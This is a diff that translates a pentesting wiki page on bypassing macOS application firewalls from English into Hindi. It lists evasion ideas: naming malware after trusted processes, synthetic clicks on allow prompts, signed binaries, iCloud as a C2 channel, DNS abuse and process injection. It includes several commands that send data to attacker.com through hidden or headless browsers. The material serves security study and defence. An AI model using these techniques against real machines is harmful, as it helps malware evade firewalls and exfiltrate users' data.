@@ -4,82 +4,72 @@
 
 ## Found techniques
 
-The following techniques were found working in some macOS firewall apps.
+कुछ तकनीकें macOS फ़ायरवॉल ऐप्स में काम करती पाई गईं।
 
 ### Abusing whitelist names
 
-- For example calling the malware with names of well known macOS processes like **`launchd`**
+- उदाहरण के लिए, **`launchd`** जैसे प्रसिद्ध macOS प्रक्रियाओं के नामों के साथ मैलवेयर को कॉल करना
 
 ### Synthetic Click
 
-- If the firewall ask for permission to the user make the malware **click on allow**
+- यदि फ़ायरवॉल उपयोगकर्ता से अनुमति मांगता है, तो मैलवेयर को **अनुमति पर क्लिक** करने के लिए कहें
 
 ### **Use Apple signed binaries**
 
-- Like **`curl`**, but also others like **`whois`**
+- जैसे **`curl`**, लेकिन अन्य जैसे **`whois`** भी
 
 ### Well known apple domains
 
-The firewall could be allowing connections to well known apple domains such as **`apple.com`** or **`icloud.com`**. And iCloud could be used as a C2.
+फ़ायरवॉल प्रसिद्ध एप्पल डोमेन जैसे **`apple.com`** या **`icloud.com`** के लिए कनेक्शन की अनुमति दे सकता है। और iCloud को C2 के रूप में उपयोग किया जा सकता है।
 
 ### Generic Bypass
 
-Some ideas to try to bypass firewalls
+फ़ायरवॉल को बायपास करने के लिए कुछ विचार
 
 ### Check allowed traffic
 
-Knowing the allowed traffic will help you identify potentially whitelisted domains or which applications are allowed to access them
-
+अनुमत ट्रैफ़िक को जानने से आपको संभावित रूप से व्हाइटलिस्टेड डोमेन या उन अनुप्रयोगों की पहचान करने में मदद मिलेगी जिन्हें उन तक पहुँचने की अनुमति है।
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
+### DNS का दुरुपयोग
 
-### Abusing DNS
-
-DNS resolutions are done via **`mdnsreponder`** signed application which will probably vi allowed to contact DNS servers.
+DNS समाधान **`mdnsreponder`** साइन किए गए एप्लिकेशन के माध्यम से किए जाते हैं जो शायद DNS सर्वरों से संपर्क करने की अनुमति दी जाएगी।
 
 <figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
-### Via Browser apps
+### ब्राउज़र ऐप्स के माध्यम से
 
 - **oascript**
-
 ```applescript
 tell application "Safari"
-    run
-    tell application "Finder" to set visible of process "Safari" to false
-    make new document
-    set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
+run
+tell application "Finder" to set visible of process "Safari" to false
+make new document
+set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
 end tell
 ```
-
-- Google Chrome
-
+- गूगल क्रोम
 ```bash
 "Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-
-- Firefox
-
+- फ़ायरफ़ॉक्स
 ```bash
 firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-
-- Safari
-
+- सफारी
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
+### प्रक्रियाओं में कोड इंजेक्शन के माध्यम से
 
-### Via processes injections
-
-If you can **inject code into a process** that is allowed to connect to any server you could bypass the firewall protections:
+यदि आप किसी **प्रक्रिया में कोड इंजेक्ट कर सकते हैं** जिसे किसी भी सर्वर से कनेक्ट करने की अनुमति है, तो आप फ़ायरवॉल सुरक्षा को बायपास कर सकते हैं:
 
 {{#ref}}
 macos-proces-abuse/
 {{#endref}}
 
-## References
+## संदर्भ
 
 - [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
 
